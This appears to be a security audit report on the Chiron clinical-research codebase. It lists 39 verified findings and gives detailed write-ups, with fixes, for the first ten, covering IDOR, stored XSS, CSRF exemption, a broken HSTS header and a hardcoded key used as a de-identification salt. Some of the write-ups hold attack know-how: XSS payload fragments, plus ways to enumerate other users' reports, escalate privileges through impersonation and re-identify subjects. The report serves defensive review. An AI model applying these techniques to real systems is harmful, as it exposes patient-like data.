# Chiron — Security Vulnerabilities (Task 4)

Full-codebase security review of both Chiron repos **and** the Task-3 validator. Findings were produced by parallel dimension-specific finders and then **adversarially verified** at their cited `file:line` by an independent pass (16 candidate findings were rejected as false positives and are not listed). Given the clinical-research context, items touching patient-like data are called out explicitly. Nothing here was fixed beyond what `IMPROVEMENTS.md` records; severities are the verifier's corrected values.

## Summary

**39 findings** (adversarially verified — false positives dropped). Counts by severity:

| 🟥 HIGH | 🟧 MEDIUM | 🟨 LOW | ⬜ INFO | Total |
|---|---|---|---|---|
| 3 | 11 | 14 | 11 | 39 |

| # | Sev | Finding | Location |
|---|-----|---------|----------|
| 1 | high | v1 ReportViewSet custom actions (edit_form/delete_form/share_form/flag) bypass object-leve | `chiron/api/viewsets/report.py:134 (flag), :211 (edit_form), :252 (shar` |
| 2 | high | Stored XSS: concept description rendered via dangerouslySetInnerHTML with no sanitization | `is4r-chiron-ui-develop/src/routes/query.tsx:208-214 (sink at :211-212)` |
| 3 | high | ETL log / data-issue views expose raw subject-matching identifiers and source values with  | `is4r-chiron-develop/chiron/views/views_backend.py:79-173 (etl_logs:100` |
| 4 | medium | v1 report_tools load_as_active/export_csv/export_json/preview: no ownership/sharing/datase | `chiron/api/viewsets/report_tools.py:114 (load_as_active), :140 (export` |
| 5 | medium | Snapshot retrieve IDOR: cohort_def/table_def/analysis_def read any user's saved definition | `chiron/api/viewsets/cohort_def.py:90` |
| 6 | medium | ChironUserViewSet returns all users across ALL datasets — cross-dataset PII enumeration | `chiron/api/viewsets/chiron_user.py:18-33 (get_queryset), serializer ch` |
| 7 | medium | view_as_other_user impersonation has no target restrictions or audit; enables staff→superu | `chiron/middleware/view_as_other_user.py:15-24` |
| 8 | medium | CSRF protection disabled on session-authenticated, state-changing API endpoints (shipped l | `chiron/api/utils/authentication.py:6-14` |
| 9 | medium | nginx HSTS header name misspelled — intended TLS-enforcement header is silently never appl | `is4r-chiron-ui-develop/nginx.conf:28` |
| 10 | medium | Hardcoded Django SECRET_KEY in reference project — also used as the de-identification salt | `test_project/project/settings.py:26 (SECRET_KEY)` |
| 11 | medium | CSV formula (spreadsheet) injection in cohort/report/pivot exports | `chiron/api/utils/export.py:104 and :106 (generate_cohort_csv)` |
| 12 | medium | Missing and misspelled HTTP security headers (broken HSTS, no CSP/X-Frame-Options/nosniff) | `is4r-chiron-ui-develop/nginx.conf:28 (and absence throughout nginx.con` |
| 13 | medium | user_report lists all users across all datasets and enables unrestricted 'view as' imperso | `is4r-chiron-develop/chiron/views/views_backend.py:209-225 (qChironUser` |
| 14 | medium | DDL/identifier injection via unvalidated metadata identifiers (schema/table/column names)  | `chiron/query_engine/postgres/db_writer.py:78,88,91,144,153,156,385,449` |
| 15 | low | Concept retrieve returns concept metadata without dataset check (low-sensitivity cross-dat | `chiron/api/viewsets/concept.py:157 (retrieve), :190 (update)` |
| 16 | low | Reference/demo Django settings omit all session, CSRF, and transport security flags | `test_project/project/settings.py (no SESSION_COOKIE_SECURE / CSRF_COOK` |
| 17 | low | Vite dev server sets Access-Control-Allow-Origin: * (dev-only) | `is4r-chiron-ui-develop/vite.config.ts:11-13` |
| 18 | low | requests lower bound (>=2.26.0) permits multiple credential-leak CVEs | `/Users/pot95a/2026/new_chiron/is4r-chiron-develop/requirements/base.tx` |
| 19 | low | Django lower bound (>=3.2.23) permits an end-of-life, unpatched release series | `/Users/pot95a/2026/new_chiron/is4r-chiron-develop/requirements/base.tx` |
| 20 | low | djangorestframework lower bound (>=3.12.4) permits browsable-API XSS (CVE-2024-21520) | `/Users/pot95a/2026/new_chiron/is4r-chiron-develop/requirements/base.tx` |
| 21 | low | No Python dependency lockfile — backend versions are unpinned/unverifiable and drift | `/Users/pot95a/2026/new_chiron/is4r-chiron-develop/requirements/base.tx` |
| 22 | low | unicodecsv is unmaintained and redundant on Python 3 | `/Users/pot95a/2026/new_chiron/is4r-chiron-develop/requirements/base.tx` |
| 23 | low | Ontology dependency pinned to a mutable git tag over the network | `/Users/pot95a/2026/new_chiron/is4r-chiron-develop/requirements/ontolog` |
| 24 | low | Path traversal / arbitrary file read-write in backup & restore commands | `chiron/helpers.py:149 (prepare_backup_file_path)` |
| 25 | low | Unbounded file path in CSV source ingestion via string concatenation | `chiron/processors/source/csv.py:57` |
| 26 | low | Result-cell link renders unsanitized href with target=_blank and no rel | `is4r-chiron-ui-develop/src/components/Results/FormatCell.tsx:20-25 (si` |
| 27 | low | Upstream error-response bodies (Django DEBUG tracebacks) are captured verbatim into unprot | `chiron_validator/runner.py:260-266 (_body_snippet)` |
| 28 | low | Hardcoded default dev password in source; credentials accepted via argv | `chiron_validator/cli.py:97-98 (defaults), :43 (passed to client)` |
| 29 | info | DEBUG=True with no global DRF permission default in the runnable reference settings | `test_project/project/settings.py:29 (DEBUG=True) and absence of any RE` |
| 30 | info | Hardcoded default Postgres credentials in reference/test config (demo-only) | `test_project/project/settings.py:149 and test_project/test_settings.py` |
| 31 | info | MUI x-license key injected via Docker build ARG (persists in image metadata) | `is4r-chiron-ui-develop/Dockerfile:2-3 (ARG/ENV VITE_MUI_KEY) and src/A` |
| 32 | info | UI dependencies checked — resolved versions are at patched releases (no CVE findings) | `/Users/pot95a/2026/new_chiron/is4r-chiron-ui-develop/package.json, pnp` |
| 33 | info | No unsafe deserialization present in application code (scope confirmation) | `chiron/ (whole tree)` |
| 34 | info | Verified non-issues (documented for completeness) | `is4r-chiron-ui-develop/src/App.tsx:22` |
| 35 | info | Bundled Django projects ship DEBUG=True, which would render patient-like data in 500 trace | `is4r-chiron-develop/test_project/project/settings.py:29` |
| 36 | info | Runtime query-engine path (cohort/report/analysis compilation) is parameterized — no injec | `chiron/query_engine/postgres/sql_alchemy_queries/ (query_builder.py, s` |
| 37 | info | query subcommand executes arbitrary, unparameterized SQL against the local validation DB | `chiron_validator/cli.py:73-83 (cmd_query -> db.conn.execute(args.sql))` |
| 38 | info | Public-API-only / no-internal-access constraint verified as HELD; TLS verification on by d | `chiron_validator/client.py (whole module)` |
| 39 | info | SSRF surface via --base-url with default redirect-following (low real risk; operator-contr | `chiron_validator/client.py:77-90 (request` |

## Findings (detail)

### 1. 🟥 HIGH — v1 ReportViewSet custom actions (edit_form/delete_form/share_form/flag) bypass object-level authz — edit/delete/re-share ANY report across ALL datasets by pk

- **Category:** idor-broken-access-control  
- **Verification:** CONFIRMED  
- **Location:** `chiron/api/viewsets/report.py:134 (flag), :211 (edit_form), :252 (share_form), :286-288 (delete_form)`

**What it is.** ReportViewSet lists UserCreatedContentPermission in permission_classes, but DRF only runs has_object_permission when a view calls self.get_object(). All four custom @action methods fetch the object with `models.UserCreatedContent.objects.get(pk=pk)` (report.py:134,211,252,286) instead of self.get_object(), so has_object_permission is NEVER invoked and get_queryset()/get_viewable_reports() scoping is never applied. There is no dataset filter and no creator check. Concretely: `delete_form` POST calls oContent.delete() (report.py:288), `edit_form` POST saves arbitrary field/def changes (report.py:217-223), `share_form` POST rewrites sharing (report.py:260). Because the pk is a raw global primary key with no dataset/owner scoping, any user who reaches this viewset can target reports belonging to other users AND other datasets. authentication_classes=[CsrfExemptSessionAuthentication] also disables CSRF, so these destructive actions are additionally forgeable. The routes are live: chiron/api/urls.py:20 registers 'reports' and chiron/urls.py:101 includes 'api/'. The v2 equivalent (chiron/api_v2/viewsets/report.py:390,453,517) was explicitly fixed to use `get_object_or_404(self.get_queryset(), pk=pk)`, confirming this is the unfixed variant. Standard retrieve/update/destroy are NOT affected (they go through get_object).

**Impact.** Horizontal + cross-tenant privilege escalation on a clinical-research tool. An authenticated user with subject-level (DEID/PHI) access to any one dataset can permanently delete, silently modify (including overwriting the cohort_def/table_def), or re-share any saved report in any dataset by iterating integer pks. share_form self-grant: an attacker in the same dataset as a victim can add their own ChironUser to a private (public=False) report's share list, causing it to appear in their get_viewable_reports and enabling full read/preview/export of the victim's private query and results. Data-integrity and confidentiality loss across dataset boundaries.

**Fix.** Replace `models.UserCreatedContent.objects.get(pk=pk)` in flag/edit_form/share_form/delete_form with `oContent = self.get_object()` (runs get_queryset() scoping + check_object_permissions) or mirror v2's `get_object_or_404(self.get_queryset(), pk=pk)`. Note that with get_object(), UserCreatedContentPermission.has_object_permission already enforces creator-only for non-SAFE methods (permissions.py:52), so an explicit creator check for edit/delete/share is satisfied — but the flag action is a POST too, so confirm whether flagging a public/shared report should be allowed (has_object_permission would restrict flag to the creator for POST, which may be unintended for starring; if starring of viewable reports is desired, gate flag on the SAFE-method read predicate instead). Also remove CsrfExemptSessionAuthentication or add CSRF enforcement for these state-changing endpoints.

> _Verifier note:_ Verified all cited locations in chiron/api/viewsets/report.py. The four custom @action methods fetch objects with `models.UserCreatedContent.objects.get(pk=pk)` at lines 134 (flag), 211 (edit_form), 252 (share_form), 286 (delete_form) — a raw global primary-key lookup with no dataset or owner scoping. DRF only invokes check_object_permissions/has_object_permission when a view calls self.get_object(); these actions never do, so UserCreatedContentPermission.has_object_permission (permissions.py:40-52, the public/shared/creator owner check) is never run. The class-level has_permission (permission


### 2. 🟥 HIGH — Stored XSS: concept description rendered via dangerouslySetInnerHTML with no sanitization

- **Category:** xss  
- **Verification:** CONFIRMED  
- **Location:** `is4r-chiron-ui-develop/src/routes/query.tsx:208-214 (sink at :211-212); data source is server field defined at is4r-chiron-develop/chiron/models/data_definition_models.py:646`

**What it is.** query.tsx renders the concept description as raw HTML: `<div style={{fontWeight:300}} dangerouslySetInnerHTML={{ __html: queryConceptData.description }} />`. queryConceptData comes from the backend (store/cohortSlice.ts sets `queryConceptData: response` at ~line 572; description is typed at cohortSlice.ts:134) and maps to the Concept model's `description = models.TextField(...)` (data_definition_models.py:646), which is edited by staff through the Django admin (the in-app 'Edit Concept' button links to /admin/chiron/concept/<pk>, query.tsx:145-153). The TextField has no HTML sanitization on input, and dangerouslySetInnerHTML applies none on output. A description containing `<img src=x onerror=...>` or `<svg onload=...>` executes arbitrary JS in the browser of every user who opens that concept. Notably, everywhere else the app deliberately sanitizes server-supplied HTML through interweave's <Interweave> (DescribeFilters.tsx:65, CriteriaSet.tsx:150/219/298 — verified in node_modules/interweave 13.1.1 to strip on* handlers, javascript:/vbscript: schemes, and script tags), making this raw sink an inconsistent oversight rather than an intentional trust decision.

**Impact.** Stored/persistent XSS in a PHI-handling clinical tool. A user with concept-edit rights can plant a payload that runs in every viewer's authenticated session: because the API uses cookie auth with credentials:'include' (api/index.ts:9), the payload can issue authenticated API calls, exfiltrate PHI rendered on screen, and pivot across users — cross-user impact even if session cookies are httpOnly.

**Fix.** Render via the same sanitizer used elsewhere: `<Interweave content={queryConceptData.description} />` (matching DescribeFilters.tsx / CriteriaSet.tsx). If raw block-level HTML must be preserved, sanitize with DOMPurify before injection. As defense-in-depth, sanitize/allowlist the description server-side in ConceptSerializer or on model save, since input arrives via Django admin and django_autocreate (field.help_text at django_autocreate.py:306) with no escaping.

> _Verifier note:_ I independently opened every cited location and confirmed the vulnerability end-to-end.  SINK: query.tsx lines 208-214 render `queryConceptData.description` via `dangerouslySetInnerHTML={{ __html: queryConceptData.description }}` with no sanitization. This is the ONLY dangerouslySetInnerHTML in src/ (grep confirmed) — every other server-HTML render uses <Interweave> (DescribeFilters.tsx:65, CriteriaSet.tsx:150/219/298), which sanitizes. interweave version confirmed as 13.1.1. So the finding's "inconsistent oversight" framing is accurate.  DATA FLOW: cohortSlice.ts:572 sets `queryConceptData: r


### 3. 🟥 HIGH — ETL log / data-issue views expose raw subject-matching identifiers and source values with no dataset scoping and no access-level check (cross-dataset IDOR + PHI-tier bypass)

- **Category:** broken-access-control  
- **Verification:** CONFIRMED  
- **Location:** `is4r-chiron-develop/chiron/views/views_backend.py:79-173 (etl_logs:100, etl_log_details:112, source_data_issues:122, source_record_subject_matching:135, record_logs_for_subject:157-160); templates chiron/templates/chiron/backend/source_record_subject_matching.html:74-88, record_logs_for_subject.html:55-68, source_data_issues.html:47-63; data written in chiron/etl/logger.py:131-139,151-158`

**What it is.** All five ETL-log views are gated only by @login_required + @dataset_selector + @user_passes_test(user_is_staff). user_is_staff (chiron/authorization.py:13-19) checks Django's GLOBAL request.user.is_staff, and dataset_selector only requires that the user has *some* ChironUser on the active dataset -- it never inspects request.chironuser.access_level. The queries are also never scoped to request.dataset: etl_logs runs models.EtlLog.objects.all() (views_backend.py:100), and the detail views do get_object_or_404(EtlLog/SourceEtlLog, pk=<url value>) (lines 112, 122, 135, 157) with the numeric id / subject_id taken straight from the URL and no dataset filter, even though EtlLog carries a dataset field (log_models.py:15). The rendered rows contain the most sensitive raw linkage data: SourceRecordEtlLog.subject_id / add_ids / subject_final_ids / match_def (log_models.py:118-128, populated verbatim in logger.py:151-158 from the actual subject-match identifiers -- MRN/name/DOB-type values) and ConceptIssueExampleEtlLog.input_value / stored_value (log_models.py:154-157, populated in logger.py:131-139 with literal source-record values that triggered a data issue). Two distinct authz failures result: (1) Cross-dataset IDOR -- a staff user of dataset A can enumerate/guess ids and read dataset B's raw subject-matching data and example values (e.g. /backend/etl_logs/<id>/source/<source_log_id>, /backend/etl_logs/<log_id>/subject/<subject_id>), and etl_logs lists every dataset's runs; (2) Access-tier bypass -- a DEID- or AGG-level staff ChironUser, who is by design forbidden from viewing PHI/subject-level identifiers, sees them here because access_level is never checked. This directly contradicts the per-dataset, per-tier model enforced elsewhere (e.g. data_definition_models.py:1101-1103 blocks cross-dataset concept access; 1108-1132 gates PHI by access_level).

**Impact.** An authenticated staff user with access to any single dataset can read raw patient-identifying match keys (subject ids, added ids, match rules) and literal source data example values for ALL datasets in the instance, and can do so even when their own access tier is DEID or AGG. This breaks both multi-tenant isolation and the PHI/DEID/AGG access model for the most sensitive (re-identifying) data the system stores.

**Fix.** Apply the proposed dataset scoping and tier check, which are accurate: 1) etl_logs -> EtlLog.objects.filter(dataset=request.dataset.unique_id) (EtlLog.dataset stores the slug unique_id per logger.py:34, so match on request.dataset.unique_id, not the Dataset object). 2) Detail views: etl_log_details -> get_object_or_404(EtlLog, pk=log_id, dataset=request.dataset.unique_id); source_data_issues/source_record_subject_matching -> get_object_or_404(SourceEtlLog, pk=source_log_id, etl_log__dataset=request.dataset.unique_id); record_logs_for_subject -> scope the EtlLog lookup and the SourceRecordEtlLog filter with source_log__etl_log__dataset=request.dataset.unique_id. 3) Add a per-dataset PHI gate for the subject-matching views (and ideally source_data_issues, since example values are literal source data): require request.chironuser.access_level == ChironUser.AccessLevel.PHI (or a dedicated 'can view ETL logs' permission), because global is_staff does not enforce the tier model. 4) Longer term, consider masking or not persisting raw identifier/example values in SourceRecordEtlLog/ConceptIssueExampleEtlLog so PHI does not live outside the tiered query engine.

> _Verifier note:_ Verified all cited locations. views_backend.py: the five ETL-log views (etl_logs L100, etl_log_details L112, source_data_issues L122, source_record_subject_matching L135, record_logs_for_subject L157-160) are gated only by @login_required + @dataset_selector + @user_passes_test(user_is_staff). authorization.py:13-19 confirms user_is_staff returns Django's GLOBAL user.is_staff; dataset_selector (76-102) only ensures a ChironUser exists for the active dataset and never checks access_level. None of the queries filter by dataset: etl_logs uses EtlLog.objects.all() (lists every dataset's runs, pagi


### 4. 🟧 MEDIUM — v1 report_tools load_as_active/export_csv/export_json/preview: no ownership/sharing/dataset scoping (IDOR on saved reports)

- **Category:** idor-broken-access-control  
- **Verification:** CONFIRMED  
- **Location:** `chiron/api/viewsets/report_tools.py:114 (load_as_active), :140 (export_csv), :162 (export_json), :207 (preview)`

**What it is.** Each of these actions does `get_object_or_404(models.UserCreatedContent, pk=pk)` with no dataset, creator, share, or public check, then reads the report's cohort_def/table_def via oContent.get_def_value(...) and either loads them into the caller's active snapshot (load_as_active), or executes them (export/preview). ReportToolsViewSet.permission_classes is [IsAuthenticated, DatasetSelector, SubjectLevelAccess] with no object-level permission class, and the actions never call get_object(). By contrast, the sibling `share` action (report_tools.py:68) DOES gate on `user_content.creator != request.chironuser` and is therefore safe for writes; only these four read/execute actions are unprotected. The v2 version (chiron/api_v2/viewsets/report_tools.py:113,141,165,212) added `.filter(dataset=request.dataset)`, confirming v1 is the unfixed variant. Note the query itself is executed as request.chironuser via export_utils.generate_cohort_csv/json / get_paginated_preview (chiron/api/utils/export.py:14,68,146), so returned rows are limited to the caller's own access scope — the leak is the victim's saved query DEFINITION and unauthorized execution, not direct PHI over-disclosure.

**Impact.** Any authenticated user with subject-level access can enumerate report pks (global integers) across all datasets and disclose other researchers' private cohort/table definitions (which encode sensitive research criteria, e.g. diagnosis/age/medication inclusion filters) via load_as_active/preview, and run arbitrary saved reports. Confidentiality of research intent and saved-query IP across users and datasets.

**Fix.** In each of load_as_active, export_csv, export_json, and preview in chiron/api/viewsets/report_tools.py, replace get_object_or_404(models.UserCreatedContent, pk=pk) with get_object_or_404(request.chironuser.get_viewable_reports(), pk=pk). This enforces dataset scoping plus creator/shared/public access in one call, matching the existing object-level policy in UserCreatedContentPermission and improving on v2's dataset-only filter (which still leaves same-dataset private reports exposed).

> _Verifier note:_ Verified all four cited actions in chiron/api/viewsets/report_tools.py: load_as_active (:114), export_csv (:140), export_json (:162), preview (:207) each do get_object_or_404(models.UserCreatedContent, pk=pk) with zero dataset/creator/share/public scoping, then read cohort_def/table_def and load/execute them. permission_classes = [IsAuthenticated, DatasetSelector, SubjectLevelAccess]; reading permissions.py, DatasetSelector only sets request.dataset/chironuser and SubjectLevelAccess only checks PHI/DEID level — neither is object-level. The correct object-level class UserCreatedContentPermissio


### 5. 🟧 MEDIUM — Snapshot retrieve IDOR: cohort_def/table_def/analysis_def read any user's saved definition by pk (v1 all three; v2 cohort_def also)

- **Category:** idor-broken-access-control  
- **Verification:** CONFIRMED  
- **Location:** `chiron/api/viewsets/cohort_def.py:90; chiron/api/viewsets/table_def.py:83; chiron/api/viewsets/analysis_def.py:91; chiron/api_v2/viewsets/cohort_def.py:9-25 (inherits vulnerable retrieve)`

**What it is.** The retrieve methods call `get_object_or_404(models.CohortDefSnapshot\|TableDefSnapshot\|AnalysisDefSnapshot, pk=pk)` with no filter on the owning chironuser. These snapshot models are strictly per-user (chironuser FK: chiron/models/user_models.py:179,290,404) and per-dataset by extension. The response returns get_cohort_def()/get_table_def()/get_analysis_def() plus previous_snapshot_id/next_snapshot_id (which are computed against the victim's own chironuser, chiron/models/user_models.py:246-262/357-377, leaking adjacent snapshot pks). set_active is safe (it re-filters by chironuser), but the definition is still returned. v2 explicitly fixed table_def (chiron/api_v2/viewsets/table_def.py:41) and analysis_def (chiron/api_v2/viewsets/analysis_def.py:37) with `.filter(chironuser=request.chironuser)`, but v2 cohort_def (chiron/api_v2/viewsets/cohort_def.py) only overrides get_queryset and INHERITS the vulnerable v1 retrieve — and that retrieve hard-codes the unscoped lookup and never consults get_queryset, so the v2 get_queryset override is dead code and v2 cohort_def retrieve remains vulnerable.

**Impact.** Any authenticated user with workspace/subject-level access can read any other user's in-progress cohort, table, or analysis definitions (and walk their snapshot history) by iterating integer pks, cross-user and cross-dataset. Cohort definitions are the most sensitive (encode subject selection criteria). Confidentiality of unsaved research work.

**Fix.** Scope each v1 retrieve to the owner: oSnapshot = get_object_or_404(models.CohortDefSnapshot.objects.filter(chironuser=request.chironuser), pk=pk) (and analogous TableDefSnapshot/AnalysisDefSnapshot changes). For v2 cohort_def, add a retrieve override that uses the scoped queryset, matching v2 table_def/analysis_def, since the inherited ViewSet.retrieve ignores get_queryset(). Optionally refactor to self.get_object() with a shared get_queryset so object-level scoping is centralized.

> _Verifier note:_ Verified all cited locations. v1 retrieve methods use unscoped get_object_or_404: cohort_def.py:90 (CohortDefSnapshot), table_def.py:83 (TableDefSnapshot), analysis_def.py:91 (AnalysisDefSnapshot), each fetching a snapshot by pk with no chironuser filter, then returning get_cohort_def()/get_table_def()/clean_analysis_def() plus previous/next snapshot ids. Confirmed the snapshot models are strictly per-user via a chironuser FK (user_models.py:179, 290, 404), and get_previous()/get_next() (lines 246-262) filter by self.chironuser (the fetched/victim snapshot's owner), so previous_snapshot_id/nex


### 6. 🟧 MEDIUM — ChironUserViewSet returns all users across ALL datasets — cross-dataset PII enumeration

- **Category:** idor-broken-access-control  
- **Verification:** CONFIRMED  
- **Location:** `chiron/api/viewsets/chiron_user.py:18-33 (get_queryset), serializer chiron/api/serializers.py:24-50`

**What it is.** get_queryset returns `models.ChironUser.objects.order_by('user__last_name')` with no filter on request.dataset. permission_classes is only [IsAuthenticated, DatasetSelector] (no workspace/subject-level gate). ChironUserSerializer exposes each user's first_name, last_name, email (via nested UserSerializer, serializers.py:24-27), access_level, and permission_groups. The `term` query param (chiron_user.py:22-27) allows searching by email/name, enabling targeted lookup. ChironUser is explicitly a per-dataset object (user_models.py:86-113, unique_together dataset+user), and the intended scoping exists elsewhere in the codebase (v2 report.py:254 filters share candidates by `dataset=oContent.creator.dataset`), so the missing dataset filter here is a defect, not by design.

**Impact.** In any multi-dataset deployment, an authenticated user with access to a single dataset can enumerate the full roster of researchers/staff across every dataset, including names, email addresses, access levels, and permission-group membership. PII disclosure and reconnaissance for targeting other datasets' users.

**Fix.** In get_queryset, scope to the active dataset before other filters: `queryset = models.ChironUser.objects.filter(dataset=self.request.dataset).order_by("user__last_name")`. request.dataset is guaranteed set by DatasetSelector.has_permission. This mirrors the existing pattern at api_v2/viewsets/report.py:254. Optionally also drop `email` from UserSerializer for the share-picker use case if full email exposure is not required.

> _Verifier note:_ All claims verified against source. chiron/api/viewsets/chiron_user.py:19 returns `models.ChironUser.objects.order_by("user__last_name")` with no dataset filter; it's a ReadOnlyModelViewSet registered at `chiron_users` (chiron/api/urls.py:7) protected only by [IsAuthenticated, DatasetSelector]. ChironUserSerializer (serializers.py:30-50) exposes nested user first_name/last_name/email/username (UserSerializer, lines 24-27) plus access_level and permission_groups. The `term` param (chiron_user.py:22-27) enables icontains search by name/email across all datasets. ChironUser is per-dataset (user_m


### 7. 🟧 MEDIUM — view_as_other_user impersonation has no target restrictions or audit; enables staff→superuser escalation

- **Category:** impersonation-privilege-escalation  
- **Verification:** CONFIRMED  
- **Location:** `chiron/middleware/view_as_other_user.py:15-24; setter chiron/views/views_backend.py:216-220`

**What it is.** The ViewAsOtherUser middleware reads session['override_user_id'] and unconditionally sets request.user to that Django user for the whole request (and thus for downstream DRF permission checks). The middleware performs no authorization itself. The only writer of override_user_id is the user_report view (views_backend.py:216-219), which is correctly gated by @user_passes_test(user_is_staff) — so arbitrary users cannot start impersonation. However, once gated, `override_user_id = int(request.POST.get('override_user_id'))` accepts ANY user id with no constraint: no check that the target belongs to the current dataset, no check that the target is not a superuser or higher-privileged, and no audit record. Because the middleware replaces request.user globally, an impersonated identity also applies to Django admin (which authorizes on request.user.is_staff/is_superuser). The middleware is a shippable, opt-in component and is installed in the reference settings (test_project/project/settings.py:62). Also `int(request.POST.get('override_user_id', None))` raises TypeError (500) when the field is absent — robustness bug.

**Impact.** A Chiron 'staff' user (which is distinct from a Django superuser in this app and gates only Chiron admin views) can impersonate a Django superuser via override_user_id and then act as that superuser everywhere, including /admin/ — a staff→superuser privilege escalation. More generally, impersonation of any user in any dataset with no logging undermines attribution and the dataset access boundary.

**Fix.** In user_report's POST handler, validate the target before storing: parse safely (target = request.POST.get('override_user_id'); require it to be present and numeric, else reject/ignore), then load the target user and reject if target.is_superuser or target.is_staff (or any privilege >= the impersonator), and require the target to have a ChironUser within request's current dataset. Write an audit-log record (impersonator id/username, target id/username, timestamp, dataset). Defensively, the middleware could also re-verify that the session that established override_user_id still belongs to a staff user, and avoid applying the override to /admin/ paths so impersonation cannot be used to reach Django superuser tooling.

> _Verifier note:_ I read all cited locations and they match the finding. chiron/middleware/view_as_other_user.py:15-24: process_request reads request.session['override_user_id'] and, if a User with that id exists, unconditionally sets request.user = oUser with no authorization logic in the middleware. It is installed as the last MIDDLEWARE entry (test_project/project/settings.py:62), after AuthenticationMiddleware, so the override replaces request.user globally for every downstream view, including Django /admin/. chiron/views/views_backend.py:206-220: user_report is correctly gated by @user_passes_test(user_is_


### 8. 🟧 MEDIUM — CSRF protection disabled on session-authenticated, state-changing API endpoints (shipped library)

- **Category:** insecure-config  
- **Verification:** CONFIRMED  
- **Location:** `chiron/api/utils/authentication.py:6-14; used at chiron/api/viewsets/query_tools.py:21, chiron/api_v2/viewsets/report.py:34, chiron/api/viewsets/report_tools.py:30, chiron/api/viewsets/analysis_def.py:27, chiron/api/viewsets/analysis_tools.py:30, chiron/api/viewsets/user_created_content_DEPRECATED.py:33`

**What it is.** CsrfExemptSessionAuthentication subclasses DRF's SessionAuthentication and overrides enforce_csrf() to a no-op (`return`), completely disabling CSRF validation while still authenticating via the session cookie. It is applied as authentication_classes on numerous state-changing viewsets in the shipped chiron package (query execution, report create/update, analysis definitions, user-created content, etc.). The code itself carries a TODO at line 11 questioning whether this is a security risk. Because these endpoints authenticate via the browser session cookie and skip CSRF entirely, a malicious page a logged-in user visits could drive authenticated write/query requests against patient-like data. Note: Django's default SESSION_COOKIE_SAMESITE='Lax' mitigates most cross-site form POSTs in modern browsers, so this is primarily a loss of defense-in-depth rather than a wide-open hole; it remains exploitable via same-site vectors, non-Lax deployments, and older clients. This is would-ship code, not demo-only.

**Impact.** Cross-site request forgery against authenticated endpoints that create/modify data and run queries over subject data; partially mitigated by SameSite=Lax default but with real residual risk.

**Fix.** Accurate as proposed. Replace CsrfExemptSessionAuthentication with rest_framework.authentication.SessionAuthentication (removing the custom class and its ~10 import/usage sites) so DRF enforces CSRF on unsafe methods; have the React SPA send the csrftoken cookie value as the X-CSRFToken header. Alternatively, if a stateless flow is genuinely needed, adopt TokenAuthentication/JWT (CSRF-exempt by design) rather than disabling CSRF on cookie auth. As additional defense-in-depth, explicitly pin SESSION_COOKIE_SAMESITE='Lax' (or 'Strict') and set CSRF_COOKIE_SAMESITE in the deployment settings so deployments do not silently regress the current default mitigation.

> _Verifier note:_ Read chiron/api/utils/authentication.py (in the actual repo root /Users/pot95a/2026/new_chiron/is4r-chiron-develop). Lines 6-14 define CsrfExemptSessionAuthentication(SessionAuthentication) overriding enforce_csrf(self, request) with a bare `return` (no-op), and line 11 carries the literal TODO: "Check whether this is a security risk for this use-case and/or threat model." This confirms CSRF validation is fully disabled while session-cookie authentication is retained. I confirmed all cited usages and found MORE than the finding listed: it is set as authentication_classes on query_tools.py:21, 


### 9. 🟧 MEDIUM — nginx HSTS header name misspelled — intended TLS-enforcement header is silently never applied

- **Category:** insecure-config  
- **Verification:** CONFIRMED  
- **Location:** `is4r-chiron-ui-develop/nginx.conf:28`

**What it is.** Line 28 is `add_header Strict-Transprot-Securty max-age=2592000;`. The header name is misspelled twice ('Transprot' and 'Securty' instead of 'Transport-Security'), so nginx emits a nonstandard header that every browser ignores — the intended HSTS protection does not exist. The value also omits includeSubDomains/preload, and no X-Frame-Options, X-Content-Type-Options: nosniff, or Content-Security-Policy headers are set on the SPA that nginx serves. This is the production container's web server (Dockerfile:14-15 copies this into nginx:1.29), so it would ship.

**Impact.** For a tool serving patient-like data, HSTS is effectively absent, leaving users exposed to protocol-downgrade / SSL-stripping man-in-the-middle on first and subsequent visits; the SPA also lacks clickjacking and MIME-sniffing protections.

**Fix.** Fix the misspelling and add the missing headers, using the `always` flag so they are sent on error responses too. Because nginx does not inherit server-level add_header into a location that sets its own, declare them where they must apply (either promote to the server block AND repeat inside `location /`, or move Cache-Control up). Example at server level plus repeated in `location /`: add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always; add_header X-Content-Type-Options "nosniff" always; add_header X-Frame-Options "DENY" always; add_header Content-Security-Policy "default-src 'self'; ..." always; Note that HSTS only takes effect over HTTPS, so also confirm TLS is terminated at this container or an upstream edge and that the edge does not already own the HSTS header.

> _Verifier note:_ Verified against /Users/pot95a/2026/new_chiron/is4r-chiron-ui-develop/nginx.conf. Line 28 is literally `add_header Strict-Transprot-Securty max-age=2592000;` — the header name is misspelled twice ("Transprot" for "Transport", "Securty" for "Security"). HSTS is triggered only by the exact token `Strict-Transport-Security`; any other name emits a nonstandard header that browsers ignore, so the intended HSTS is genuinely never applied. I read the entire 42-line file: the only other add_header is `Cache-Control "no-cache"` inside `location /` (line 38); there is no X-Frame-Options, X-Content-Type-


### 10. 🟧 MEDIUM — Hardcoded Django SECRET_KEY in reference project — also used as the de-identification salt for subject IDs

- **Category:** hardcoded-secret  
- **Verification:** CONFIRMED  
- **Location:** `test_project/project/settings.py:26 (SECRET_KEY); consumed as de-ID salt at chiron/processors/etl/auto_subject_id.py:60 and :120`

**What it is.** SECRET_KEY is a hardcoded literal ('1b_762p=...') in the runnable reference/demo settings. Beyond the usual session-cookie / password-reset-token signing exposure, the shipped ETL processors EtlGeneratedSubjectId/EtlGeneratedSubcollectionId use settings.SECRET_KEY directly as the salt for the blake2b hash that generates de-identified subject and sub-collection IDs (auto_subject_id.py:60, :71 and :120, :131). If a deployment runs with this committed key (a real risk since this is the reference config people copy), the de-identification salt is public knowledge — anyone knowing the key plus the input field format (e.g., MRN or Epic encounter CSN patterns) can recompute the hashes and re-identify subjects. The default output length of 10 yields only a 5-byte/40-bit digest, further easing brute-force re-identification.

**Impact.** Copied/leaked key enables session forgery and, more importantly for a clinical tool, defeats subject de-identification (re-identification of patient-like records).

**Fix.** Two independent fixes, both warranted: (1) In real deployments load SECRET_KEY from env/secret store and fail closed if unset; keep the demo literal only in test_project with an explicit throwaway label. (2) Decouple de-identification from SECRET_KEY in auto_subject_id.py: use a dedicated per-deployment secret (e.g. CHIRON_DEID_KEY) passed via blake2b's key= parameter rather than update()-prefixing, require it (raise/refuse to run if unset instead of the silent "nosalt :-(" fallback), and raise the default digest_size well above 5 bytes. Fix (2) matters even with a correct SECRET_KEY, since coupling the de-id secret to the broadly-exposed framework key widens the leak surface that retroactively defeats de-identification.

